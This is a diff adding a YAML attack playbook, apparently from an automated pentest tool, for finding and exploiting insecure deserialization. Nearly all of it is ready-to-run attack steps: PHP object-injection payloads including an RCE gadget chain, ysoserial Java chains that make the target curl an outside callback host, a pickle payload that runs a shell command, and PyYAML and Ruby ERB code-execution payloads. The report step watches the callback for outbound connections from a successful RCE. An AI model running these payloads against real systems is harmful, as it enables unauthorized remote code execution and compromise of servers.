@@ -1,0 +1,213 @@
+name: "Insecure Deserialization"
+description: "Detect and exploit insecure deserialization across PHP, Java, Python, .NET, and Ruby (YAML, pickle, Marshal)"
+version: "1.0"
+
+vars:
+  callback: ""
+
+preflight:
+  - id: setup
+    type: log
+    message: "Insecure Deserialization assessment on {target} (case: {case_id})"
+
+steps:
+  # ---- Phase 1: Entry point discovery ----
+  - id: discovery
+    name: "Find deserialization entry points"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: whatweb
+        name: "Technology fingerprint"
+        tool: whatweb
+        args: ["-a3", "{target}", "--log-verbose", "{case_dir}/whatweb-deser.txt"]
+        timeout: 60
+        artifacts: ["{case_dir}/whatweb-deser.txt"]
+
+      - id: param_fuzz
+        name: "Fuzz for serialized data params"
+        tool: ffuf
+        args: ["-u", "{target}/?FUZZ=O:1:\"a\":0:{}",
+               "-mc", "200,500",
+               "-o", "{case_dir}/ffuf-deser.json", "-of", "json",
+               "-ac"]
+        timeout: 120
+        artifacts: ["{case_dir}/ffuf-deser.json"]
+
+      - id: cookie_check
+        name: "Inspect cookies for serialized data"
+        tool: curl
+        args: ["-sI", "{target}", "-D", "{case_dir}/deser-cookies.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/deser-cookies.txt"]
+
+  # ---- Phase 2: PHP deserialization ----
+  - id: php_tests
+    name: "PHP deserialization probes"
+    type: parallel
+    max_workers: 4
+    steps:
+      - id: php_basic
+        name: "Basic PHP serialized payload"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-d", "data=O:1:%22a%22:0:{}",
+               "{target}", "-o", "{case_dir}/deser-php-basic.txt",
+               "-D", "{case_dir}/deser-php-headers.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/deser-php-basic.txt"]
+
+      - id: php_gc
+        name: "PHP GC bypass payload"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-d", 'data=O:10:"GCCache":0:{}',
+               "{target}", "-o", "{case_dir}/deser-php-gc.txt"]
+        timeout: 30
+
+      - id: php_rce
+        name: "PHP RCE via gadget chain"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-d", "data=O:10:%22PHPObject%22:1:{s:3:%22cmd%22;s:4:%22id%22;}",
+               "{target}", "-o", "{case_dir}/deser-php-rce.txt"]
+        timeout: 30
+
+  # ---- Phase 3: Java deserialization (ysoserial) ----
+  - id: java_tests
+    name: "Java deserialization via ysoserial"
+    type: parallel
+    max_workers: 4
+    steps:
+      - id: java_commons1
+        name: "CommonsCollections1"
+        tool: java
+        args: ["-jar", "/tools/ysoserial-all.jar", "CommonsCollections1",
+               "curl {callback}/java-cc1",
+               "|", "base64", "-w0"]
+        timeout: 60
+        artifacts: ["{case_dir}/deser-java-cc1.txt"]
+
+      - id: java_commons2
+        name: "CommonsCollections2"
+        tool: java
+        args: ["-jar", "/tools/ysoserial-all.jar", "CommonsCollections2",
+               "curl {callback}/java-cc2",
+               "|", "base64", "-w0"]
+        timeout: 60
+
+      - id: java_jdk7
+        name: "JDK7u21"
+        tool: java
+        args: ["-jar", "/tools/ysoserial-all.jar", "JDK7u21",
+               "curl {callback}/java-jdk7",
+               "|", "base64", "-w0"]
+        timeout: 60
+
+      - id: java_spring1
+        name: "Spring1"
+        tool: java
+        args: ["-jar", "/tools/ysoserial-all.jar", "Spring1",
+               "curl {callback}/java-spring1",
+               "|", "base64", "-w0"]
+        timeout: 60
+
+  # ---- Phase 4: Python picke/marshal ----
+  - id: python_tests
+    name: "Python deserialization probes"
+    type: parallel
+    max_workers: 3
+    steps:
+      - id: python_pickle
+        name: "Python pickle payload"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-d", "data=gASVJQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjARpZKWUhZRSlC4=",
+               "{target}", "-o", "{case_dir}/deser-python-pickle.txt"]
+        timeout: 30
+        artifacts: ["{case_dir}/deser-python-pickle.txt"]
+
+      - id: python_yaml
+        name: "PyYAML load() payload"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-d", "data=!!python/object/apply:subprocess.check_output ['id']",
+               "{target}", "-o", "{case_dir}/deser-python-yaml.txt"]
+        timeout: 30
+
+      - id: python_marshal
+        name: "Python marshal payload"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-d", "data=YwAAAAABAAAAAGQKAAAAAAB9AQAAAACU",
+               "{target}", "-o", "{case_dir}/deser-python-marshal.txt"]
+        timeout: 30
+
+  # ---- Phase 5: .NET deserialization ----
+  - id: dotnet_tests
+    name: ".NET deserialization probes"
+    type: conditional
+    condition:
+      any:
+        - contains: "ASP.NET"
+          ref: whatweb
+        - contains: "IIS"
+          ref: whatweb
+        - contains: ".NET"
+          ref: whatweb
+    then:
+      - id: dotnet_xml
+        name: "XMLResourceResolver deserialization"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Content-Type: application/xml",
+               "-d", '<root><data>test</data></root>',
+               "{target}", "-o", "{case_dir}/deser-dotnet-xml.txt"]
+        timeout: 30
+
+      - id: dotnet_soap
+        name: "SOAP deserialization"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-H", "Content-Type: application/soap+xml",
+               "-d", '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>data</test></soap:Body></soap:Envelope>',
+               "{target}", "-o", "{case_dir}/deser-dotnet-soap.txt"]
+        timeout: 30
+
+  # ---- Phase 6: Ruby YAML / Marshal ----
+  - id: ruby_tests
+    name: "Ruby deserialization probes"
+    type: conditional
+    condition:
+      any:
+        - contains: "Ruby"
+          ref: whatweb
+        - contains: "Rails"
+          ref: whatweb
+        - contains: "Sinatra"
+          ref: whatweb
+    then:
+      - id: ruby_yaml
+        name: "Ruby YAML.load payload"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "-d", "data=--- !ruby/object:ERB\n  src: \"id\"\n",
+               "{target}", "-o", "{case_dir}/deser-ruby-yaml.txt"]
+        timeout: 30
+
+      - id: ruby_marshal
+        name: "Ruby Marshal payload"
+        tool: curl
+        args: ["-s", "-X", "POST",
+               "--data-binary", "@-",
+               "{target}", "-o", "{case_dir}/deser-ruby-marshal.txt"]
+        timeout: 30
+
+  # ---- Phase 7: Report ----
+  - id: report
+    name: "Deserialization assessment note"
+    type: log
+    message: |
+      Insecure deserialization assessment complete for {target}.
+      Check {case_dir}/ for PHP, Java (ysoserial), Python, .NET, and Ruby probe results.
+      Monitor {callback} for outbound connections from successful RCE.
